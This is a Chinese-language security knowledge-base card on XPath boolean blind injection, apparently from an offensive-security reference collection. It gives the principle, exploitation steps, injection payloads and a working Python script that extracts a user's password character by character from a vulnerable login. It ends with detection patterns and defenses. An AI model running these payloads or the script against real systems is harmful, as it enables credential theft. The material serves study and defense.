---
id: web-generic-xpath-blind-boolean-extraction
title: XPath 布尔盲注逐字符提取 XML 节点数据
type: scenario
domain: web
path: web/generic/xpath
technique: xpath-blind-injection
aliases:
- XPath blind injection
- XPath 盲注
- XPath boolean blind
tags:
- web
- xpath
- injection
- blind
- boolean-based
- xml
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V20
  verified_at: '2026-11-05T02:09:32+08:00'
  notes: 已对照原文与6张图核对：string-length/substring 布尔盲注载荷与原文脚本一致，卡内已正确标注时间盲注为依赖非标准扩展的低置信度变体；原文布尔盲注为示意脚本、未对真实目标演示，置信度 medium 合理。frontmatter 无 sources/source_url。
---

## 一句话结论

当 XPath 注入点不回显错误或查询结果时，用 `string-length()` 与 `substring()` 构造真假条件，依据登录成功/失败等布尔差异逐字符还原 XML 节点内容。

## 原理

XPath 提供了字符串函数，可以在谓词内部对任意节点求值并返回布尔结果。攻击者把 `and string-length(...)=N` 或 `and substring(...,pos,1)='c'` 拼进谓词后，条件成立时整个表达式为真、应用走“成功”分支；不成立时查询为空、走“失败”分支。响应差异即一位信息，按长度和字符集循环即可提取任意节点文本。XPath 1.0 的谓词求值本身无副作用，因此这种技术只依赖应用层的布尔分支，不依赖报错回显。

## 触发条件

- 存在 XPath 注入点，但错误与查询结果均不回显；
- 应用对“命中”和“未命中”有可区分响应（内容、状态码、跳转、耗时均可）；
- 注入点位于可求值的谓词内，且能追加 `and` 条件；
- 目标节点路径可猜解（如 `//user[1]/password/text()`）。

## 利用步骤

1. 用恒真、恒假载荷（`' and '1'='1` / `' and '1'='2`）确认布尔差异稳定；
2. 用 `string-length(//user[1]/password/text())>N` 二分确定长度；
3. 对每个位置用 `substring(...,pos,1)='c'` 遍历字符集；
4. 对多个用户节点递增索引（`//user[2]`），或先遍历节点名/属性名；
5. 记录响应基线，处理网络抖动导致的误判。

## PoC

基础查询假设：

```xpath
//user[username/text()='{username}' and password/text()='{password}']
```

长度判断（密码长度是否大于 5）：

```text
' and string-length(//user[1]/password/text()) > 5 and '1'='1
```

首字符判断：

```text
' and substring(//user[1]/password/text(),1,1)='a' and '1'='1
```

最小自动化脚本（布尔差异以“登录成功”文本为例）：

```python
import requests

def extract(url, param):
    out = ""
    for pos in range(1, 33):
        for ch in "abcdefghijklmnopqrstuvwxyz0123456789_":
            payload = (f"' and substring(//user[1]/password/text(),{pos},1)='{ch}'"
                       f" and '1'='1")
            r = requests.get(url, params={param: payload}, timeout=10)
            if "登录成功" in r.text:
                out += ch
                break
        else:
            break
    return out
```

先确定长度可将 `substring` 循环限制在真实长度内，减少请求量。

## 变体与关联

- 时间盲注：部分 XPath 2.0/3.0 实现或厂商扩展支持 `sleep()`/耗时函数，可用 `if(条件, sleep(5), false)` 作为侧信道；XPath 1.0 标准函数集不含 sleep，原文该说法未给出具体实现与验证，按低置信度看待；
- 节点/属性枚举：配合 `name()`、`local-name()`、`//@*` 先摸清文档结构；
- 关联：SQL 盲注的布尔/时间侧信道（同构思路）、XPath 认证绕过（同注入点）。

## 检测与防御

- 检测：参数中反复出现 `substring(`、`string-length(`、`//user[`、`and '1'='1` 等模式；同一会话高频相似请求；
- 防御：杜绝字符串拼接 XPath，改用 DOM API 比较；输入白名单；统一“失败”响应，避免长度/内容/状态码差异；对查询异常与空结果返回同一页面；
- 监控：对认证接口做频率限制与异常请求告警，可显著提高盲注成本。
